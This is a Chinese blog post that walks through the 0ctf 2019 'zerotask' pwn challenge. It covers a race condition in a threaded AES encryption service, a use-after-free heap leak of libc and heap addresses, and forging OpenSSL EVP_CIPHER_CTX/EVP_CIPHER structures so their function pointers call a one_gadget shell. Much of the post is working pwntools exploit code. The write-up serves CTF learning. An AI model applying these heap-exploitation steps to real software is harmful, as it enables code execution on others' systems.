<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="pwn," />










<meta name="description" content="0ctf 2019 pwn题的第一道">
<meta name="keywords" content="pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="0ctf2019 zerotask">
<meta property="og:url" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="0ctf 2019 pwn题的第一道">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/1.PNG">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/2.PNG">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/3.PNG">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/4.PNG">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/5.PNG">
<meta property="og:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/6.PNG">
<meta property="og:updated_time" content="2019-04-23T09:19:04.707Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="0ctf2019 zerotask">
<meta name="twitter:description" content="0ctf 2019 pwn题的第一道">
<meta name="twitter:image" content="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/1.PNG">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/"/>





  <title>0ctf2019 zerotask | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/04/03/0ctf2019-zerotask/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">0ctf2019 zerotask</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-03T21:34:56+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>0ctf 2019 pwn题的第一道<br><a id="more"></a><br>感觉0ctf好难啊，一道都没有做出来，而且docker一直在update，环境一直有问题，这篇是根据大佬的<a href="https://e3pem.github.io/2019/03/27/0ctf-2019/0ctf2019-zerotask/" target="_blank" rel="noopener">writeup</a>学习的过程，想记录下来。</p>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>这道题有三个功能，add、delete和一个特殊的函数sub_165A()，可以创建、释放任意id的task，在创建时题目使用AES算法的CBC模式对数据块进行加密，其中数据块的大小自己看的时候没有找到漏洞，用户自己定义，0x0&lt;size&lt;0x1000。在函数sub_165A()创建了一个新的线程，对指定id的task的数据块进行加解密操作。</p>
<p>题目开的保护情况：</p>
<p><img src="/2019/04/03/0ctf2019-zerotask/1.PNG" alt="1"></p>
<p>在整个逻辑中有一个结构体，这里命名为task，具体结构如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>  data_addr <span class="comment">#用户定义的数据块的地址，长度为0x8</span></span><br><span class="line"><span class="number">0x8</span>  data_size <span class="comment">#用户定义的数据块大小，长度为0x8</span></span><br><span class="line"><span class="number">0x10</span> flag <span class="comment">#标识加密还是解密，加密为1，解密为2，长度为0x4</span></span><br><span class="line"><span class="number">0x14</span> key <span class="comment">#加解密使用的密钥key，长度为0x20</span></span><br><span class="line"><span class="number">0x34</span> iv  <span class="comment">#加解密使用的IV初始向量，长度为0x10</span></span><br><span class="line"><span class="number">0x58</span> EVP_CIPHER_CTX_ptr</span><br><span class="line"><span class="number">0x60</span> task_id <span class="comment">#用户定义的task_id</span></span><br><span class="line"><span class="number">0x68</span> next_ptr <span class="comment">#task以链表形式连接，新分配的task插入链表的头节点</span></span><br></pre></td></tr></table></figure>
<h2 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h2><p>该题目使用OpenSSL中的EVP库完成加解密过程，具体可以参考这篇<a href="https://blog.csdn.net/liao20081228/article/details/76285896" target="_blank" rel="noopener">博客</a>，程序中涉及到了以下函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EVP_CIPHER_CTX_new() <span class="comment">#创建EVP_CIPHER_CTX</span></span><br><span class="line">EVP_EncryptInit_ex() <span class="comment">#加密操作时初始EVP_CIPHER_CTX</span></span><br><span class="line">EVP_DecryptInit_ex() <span class="comment">#解密操作时初始EVP_CIPHER_CTX</span></span><br><span class="line">EVP_CIPHER_CTX_free() <span class="comment">#释放EVP_CIPHER_CTX</span></span><br><span class="line">EVP_aes_256_cbc() <span class="comment">#256位CBC模式的加密算法，返回该算法的结构体</span></span><br><span class="line">EVP_CipherUpdate() <span class="comment">#对称加密算法的加/解密函数</span></span><br><span class="line">EVP_CipherFinal_ex() <span class="comment">#对称加密算法的加/解密函数，用来处理最后一个分组</span></span><br></pre></td></tr></table></figure>
<p>整个加解密过程涉及到两个基本的数据结构，EVP_CIPHER与EVP_CIPHER_CTX，具体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#EVP_CIPHER_CTX</span><br><span class="line"><span class="meta">#https:<span class="comment">//github.com/openssl/openssl/blob/master/crypto/evp/evp_locl.h</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    ENGINE *engine;             <span class="comment">/* functional reference if 'cipher' is</span></span><br><span class="line"><span class="comment">                                 * ENGINE-provided */</span></span><br><span class="line">    <span class="keyword">int</span> encrypt;                <span class="comment">/* encrypt or decrypt */</span></span><br><span class="line">    <span class="keyword">int</span> buf_len;                <span class="comment">/* number we have left */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> oiv[EVP_MAX_IV_LENGTH]; <span class="comment">/* original iv */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> iv[EVP_MAX_IV_LENGTH]; <span class="comment">/* working iv */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[EVP_MAX_BLOCK_LENGTH]; <span class="comment">/* saved partial block */</span></span><br><span class="line">    <span class="keyword">int</span> num;                    <span class="comment">/* used by cfb/ofb/ctr mode */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Should this even exist? It appears unused */</span></span><br><span class="line">    <span class="keyword">void</span> *app_data;             <span class="comment">/* application stuff */</span></span><br><span class="line">    <span class="keyword">int</span> key_len;                <span class="comment">/* May change for variable length cipher */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;        <span class="comment">/* Various flags */</span></span><br><span class="line">    <span class="keyword">void</span> *cipher_data;          <span class="comment">/* per EVP data */</span></span><br><span class="line">    <span class="keyword">int</span> final_used;</span><br><span class="line">    <span class="keyword">int</span> block_mask;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> final[EVP_MAX_BLOCK_LENGTH]; <span class="comment">/* possible final block */</span></span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER_CTX */</span>;</span><br></pre></td></tr></table></figure>
<p>在每一个task中，程序为其分配了0xb0的堆块以存储EVP_CIPHER_CTX结构：</p>
<p><img src="/2019/04/03/0ctf2019-zerotask/2.PNG" alt="2"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#EVP_CIPHER</span><br><span class="line"><span class="meta">#https:<span class="comment">//github.com/openssl/openssl/blob/master/crypto/include/internal/evp_int.h</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> nid;</span><br><span class="line">    <span class="keyword">int</span> block_size;</span><br><span class="line">    <span class="comment">/* Default value for variable length ciphers */</span></span><br><span class="line">    <span class="keyword">int</span> key_len;</span><br><span class="line">    <span class="keyword">int</span> iv_len;</span><br><span class="line">    <span class="comment">/* Various flags */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="comment">/* init key */</span></span><br><span class="line">    <span class="keyword">int</span> (*init) (EVP_CIPHER_CTX *ctx, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key,</span><br><span class="line">                 <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *iv, <span class="keyword">int</span> enc);</span><br><span class="line">    <span class="comment">/* encrypt/decrypt data */</span></span><br><span class="line">    <span class="keyword">int</span> (*do_cipher) (EVP_CIPHER_CTX *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> *out,</span><br><span class="line">                      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *in, <span class="keyword">size_t</span> inl);</span><br><span class="line">    <span class="comment">/* cleanup ctx */</span></span><br><span class="line">    <span class="keyword">int</span> (*cleanup) (EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="comment">/* how big ctx-&gt;cipher_data needs to be */</span></span><br><span class="line">    <span class="keyword">int</span> ctx_size;</span><br><span class="line">    <span class="comment">/* Populate a ASN1_TYPE with parameters */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="comment">/* Get parameters from a ASN1_TYPE */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="comment">/* Miscellaneous operations */</span></span><br><span class="line">    <span class="keyword">int</span> (*ctrl) (EVP_CIPHER_CTX *, <span class="keyword">int</span> type, <span class="keyword">int</span> arg, <span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="comment">/* Application data */</span></span><br><span class="line">    <span class="keyword">void</span> *app_data;</span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER */</span> ;</span><br></pre></td></tr></table></figure>
<p>在每一个task中，程序为其分配了0x110的堆块以存储该结构，其实在EVP_CIPHER_CTX结构的第一个成员中，我们也可以得到EVP_CIPHER结构体的地址：</p>
<p><img src="/2019/04/03/0ctf2019-zerotask/3.PNG" alt="3"></p>
<p>可以看到，EVP_CIPHER是EVP_CIPHER_CTX结构体的成员，在EVP_CIPHER中，有很多指向函数的虚表指针，在漏洞利用过程中就是伪造了上面两个结构体，将EVP_CIPHER结构体中的函数指针指向我们的one_gadget。</p>
<h1 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h1><p>自己在做的时候没有找到漏洞，看了别人的writeup才知道是条件竞争的漏洞，虽然条件竞争在操作系统里学过，但第一次遇到这种漏洞和利用方式。在第三个功能“Go”中调用了函数sub_165A()，该函数中创建了一个新的线程，对对应task_id的数据块进行加密操作，然后输出，但是在进行这些操作之前有一个sleep(2)，这就导致条件竞争漏洞，在线程sleep的时间可以释放这个task_id的数据块，然后再malloc，可以进行地址的泄露和伪造数据块。伪造EVP_CIPHER是EVP_CIPHER_CTX结构体，将EVP_CIPHER结构体中的函数指针指向我们的one_gadget。</p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>初始分配4个task：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"1"</span>*<span class="number">0x20</span></span><br><span class="line">iv = <span class="string">"2"</span>*<span class="number">0x10</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">1</span>, key, iv, <span class="number">0x30</span>, <span class="string">"x"</span>*<span class="number">0x30</span>) <span class="comment">#0x30</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">1</span>, key, iv, <span class="number">0x410</span>, <span class="string">"x"</span>*<span class="number">0x410</span>) <span class="comment">#0x420</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, key, iv, <span class="number">0x10</span>, <span class="string">"y"</span>*<span class="number">0x10</span>) <span class="comment">#0x20</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>, key, iv, <span class="number">0x410</span>, <span class="string">"x"</span>*<span class="number">0x410</span>) <span class="comment">#0x420</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">1</span>, key, iv, <span class="number">0x10</span>, <span class="string">"y"</span>*<span class="number">0x10</span>) <span class="comment">#0x20</span></span><br></pre></td></tr></table></figure>
<p>利用条件竞争漏洞，进入“Go”功能3，在加密线程sleep(2)期间释放task_0和task_2，重新分配一个与task_0大小相同的task，这里是task_1，一直输入至数据块大小，不输入数据，这时指定进行加密操作的task_0经历释放至unsortedbin中又被malloc为task_1，但未进行数据填充，堆块的fd和bk中分别存储着main_arena+88的地址和heap_addr。至于为什么还要分配0x510的堆块，这里没有什么作用，不分配也可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Task id : "</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#0x420</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#0x420</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>, key, iv, <span class="number">0x500</span>, <span class="string">"c"</span>*<span class="number">0x500</span>) <span class="comment">#0x510</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##add(1,1,key,iv,0x410) #0x420</span></span><br><span class="line">p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Task id : "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Encrypt(1) / Decrypt(2): "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Key : "</span>, key)</span><br><span class="line">p.sendafter(<span class="string">"IV : "</span>, iv)</span><br><span class="line">p.sendlineafter(<span class="string">"Data Size : "</span>, str(<span class="number">0x410</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/03/0ctf2019-zerotask/4.PNG" alt="4"></p>
<p>由于输出是加密之后的数据块，我们只需用相同的key和iv进行解密即可得到libc和heap的地址，这里有一个问题是程序密文的输出长度不定，有时不是16的整数倍，然后exp会报错，没有找到原因，多试几次就可以了，后续调试中为了避免这个问题我就把地址随机化给关了，然后在exp中把libc_base和heap_leak写死。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#task 0 is task 1,fd is heap_addr,bk is main_arena+88</span></span><br><span class="line">p.recvuntil(<span class="string">"Ciphertext: \n"</span>)</span><br><span class="line">x = p.recv(<span class="number">3232</span>)</span><br><span class="line">cipher = x.replace(<span class="string">" "</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"><span class="comment">#print len(cipher)</span></span><br><span class="line">cipher = cipher[<span class="number">0</span>:<span class="number">256</span>]</span><br><span class="line">plain = decrypt(key, iv, cipher.decode(<span class="string">"hex"</span>))</span><br><span class="line">libc_leak = u64(plain[<span class="number">0</span>:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_leak =  u64(plain[<span class="number">8</span>:<span class="number">16</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ec090</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"><span class="comment">#libc_base = 0x7ffff7382000</span></span><br><span class="line"><span class="comment">#heap_leak = 0x555555757000 + 0x1730</span></span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x410</span>) <span class="comment">#不要忘了这句，线程退出后程序还等着data的输入呢</span></span><br></pre></td></tr></table></figure>
<p>另外在调试时发现如果在加密线程中attach时gdb的符号表已经没有了，看不了堆的分布情况，这个时候使用命令“add-symbol-file”手动添加符号表时，gdb显示符号表添加成功了，但是main_arena的地址错误，只有偏移，没有加libc的基址，至今没有找到解决方法。但是可以在线程结束之后再attach就可以了，但这样就是看不了线程中堆的分布。</p>
<p><img src="/2019/04/03/0ctf2019-zerotask/5.PNG" alt="5"></p>
<p>接下来就是伪造两个结构体，在task_7中伪造了EVP_CIPHER_CTX结构体，第一个成员为EVP_CIPHER的地址，指向task_8，在task_8中伪造了EVP_CIPHER结构体，将结构体中前2个虚表指针修改为one_gadget，原来这两个指针指向的函数分别完成初始化初始化密钥和加/解密的功能，所以在“Go”功能3中完成加解密操作时一定会调用这两个函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>, <span class="number">1</span>, key, iv, <span class="number">0x10</span>, <span class="string">"4"</span>*<span class="number">0x10</span>) <span class="comment">#0x20</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">1</span>, key, iv, <span class="number">0x10</span>, <span class="string">"5"</span>*<span class="number">0x10</span>) <span class="comment">#0x20</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">1</span>, key, iv, <span class="number">0x10</span>, <span class="string">"6"</span>*<span class="number">0x10</span>) <span class="comment">#0x20</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span> <span class="comment">#0x00007ffff748c38c </span></span><br><span class="line"></span><br><span class="line">fake_evp_cipher = p64(<span class="number">0x1ab</span>)+p64(<span class="number">0x1000000020</span>)+p64(<span class="number">0x1002</span>)</span><br><span class="line">fake_evp_cipher += p64(one_gadget) * <span class="number">2</span></span><br><span class="line">fake_evp_cipher += p64(<span class="number">0</span>) + p64(<span class="number">0x108</span>)</span><br><span class="line">fake_evp_cipher = fake_evp_cipher.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">1</span>, key, iv, <span class="number">0xc0</span>, p64(heap_leak+(<span class="number">0x55555575a550</span><span class="number">-0x555555758730</span>)).ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)) <span class="comment">#fake fake EVP_CIPHER_CTX 0xd0</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">1</span>, key, iv, <span class="number">0xc0</span>, fake_evp_cipher) <span class="comment">#fake EVP_CIPHER 0xd0</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/03/0ctf2019-zerotask/6.PNG" alt="6"></p>
<p>最后再利用题目的条件竞争漏洞，对task_4进行加密操作，在加密线程sleep(2)里释放task_4和task_5，再申请task_4，data_size为0x70，堆块的大小是0x80，大小正好是task结构体的大小，task_4其实伪造了一个task的结构，在堆的分布上说，正好伪造了task_4的task结构。因为释放了task_4和task_5，相应task结构体的堆块被释放，进入tcache 0x80中，这时趁着线程sleep又分配一个task_4，新的task_4的task结构体需要一个0x80的堆块，分配了原来task_5释放的task结构体相应的堆，task_4大小又是0x80，正好分配了原来task_4释放的task结构体相应的堆。在新的task_4中偏移0x58处是原来task_4的EVP_CIPHER_CTX结构体地址，我们将其修改为前面伪造的fake EVP_CIPHER_CTX，也就是task_7的数据块地址。这样在线程休眠结束后对原来的task_4进行加密时根据fake EVP_CIPHER_CTX找到fake EVP_CIPHER，调用fake EVP_CIPHER虚表指针，即one_gadget，即可获得shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Task id : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Task id : "</span>, <span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Encrypt(1) / Decrypt(2): "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Key : "</span>, key)</span><br><span class="line">p.sendafter(<span class="string">"IV : "</span>, iv)</span><br><span class="line">p.sendlineafter(<span class="string">"Data Size : "</span>, str(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_task = p64(heap_leak+(<span class="number">0x555555758af0</span><span class="number">-0x555555758730</span>))</span><br><span class="line">fake_task += p64(<span class="number">0x10</span>)</span><br><span class="line">fake_task += p32(<span class="number">1</span>) + key + iv</span><br><span class="line">fake_task += p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_task += p64(heap_leak+(<span class="number">0x55555575a240</span><span class="number">-0x555555758730</span>)) <span class="comment">#fake EVP_CIPHER_CTX</span></span><br><span class="line">p.sendline(fake_task)</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://e3pem.github.io/2019/03/27/0ctf-2019/0ctf2019-zerotask/" target="_blank" rel="noopener">https://e3pem.github.io/2019/03/27/0ctf-2019/0ctf2019-zerotask/</a></p>
<p><a href="https://blog.csdn.net/liao20081228/article/details/76285896" target="_blank" rel="noopener">https://blog.csdn.net/liao20081228/article/details/76285896</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/01/tcache利用总结/" rel="next" title="tcache利用总结">
                <i class="fa fa-chevron-left"></i> tcache利用总结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/05/IO-FILE利用总结/" rel="prev" title="IO_FILE利用总结">
                IO_FILE利用总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
